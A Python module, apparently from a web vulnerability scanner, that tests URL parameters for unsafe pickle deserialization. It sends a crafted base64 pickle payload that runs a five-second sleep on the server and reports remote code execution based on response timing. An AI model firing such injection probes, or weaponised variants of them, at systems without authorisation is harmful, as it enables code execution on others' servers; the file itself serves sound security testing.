import asyncio
import base64
from modules.core import console

# Python Pickle Injection
# Vulnerability: Unsafe deserialization of Python objects via `pickle.loads`.
# Often found in cookies or tokens (base64 encoded).
# Detection: Passive (identifying patterns) + Active (Sleep Injection).

# Generic sleep(5) payload for Python 3 (linux/windows compatible-ish)
# This is a serialized object that executes 'import time; time.sleep(5)' on unpickling.
# Note: Real exploitation usually requires exact OS/Env matching, but simple probes work for detection.

PICKLE_SLEEP_PAYLOAD = b'\x80\x04\x95\x21\x00\x00\x00\x00\x00\x00\x00\x8c\x04time\x94\x8c\x05sleep\x94\x93\x94K\x05\x85\x94R\x94.'
PICKLE_BASE64 = base64.b64encode(PICKLE_SLEEP_PAYLOAD).decode()

async def check_pickle(session, url, param):
    try:
        # 1. Passive Check: Look for Base64 strings that decode to pickle magic bytes
        # Magic bytes: 80 03, 80 04, etc.
        # This part is hard to automate reliably without context, skipping to Active.

        # 2. Active Probe (Time Based)
        # We inject our base64 payload
        target = f"{url}?{param}={PICKLE_BASE64}"
        if "?" in url: target = f"{url}&{param}={PICKLE_BASE64}"
        
        start_time = asyncio.get_event_loop().time()
        try:
            async with session.get(target, timeout=20, ssl=False) as resp:
                await resp.read()
        except Exception:
            pass
        end_time = asyncio.get_event_loop().time()
        
        duration = end_time - start_time
        
        if duration >= 4.5:
             return {
                "url": target,
                "param": param,
                "type": "Pickle Injection (RCE)",
                "evidence": "Time-Based execution detected (sleep 5)"
            }

    except Exception:
        pass
    return None

async def scan_pickle(session, url):
    """
    Scan for Python Pickle Injection (Serialization RCE).
    """
    console.print(f"\n[bold cyan]--- Pickle Injection Scanner ---[/bold cyan]")
    
    # Params that often hold state
    params = ["data", "state", "session", "auth", "token", "remember"]
    
    # Only scan if target looks like Python? (Hard to know, so we just scan)
    tasks = [check_pickle(session, url, p) for p in params]
    results = await asyncio.gather(*tasks)
    
    found = []
    for res in results:
        if res:
             console.print(f"  [bold red][!] PICKLE RCE DETECTED: {res['param']}[/bold red]")
             console.print(f"      Evidence: {res['evidence']}")
             found.append(res)
             
    if not found:
        console.print("[dim][-] No Pickle RCE indicators found.[/dim]")
        
    return found
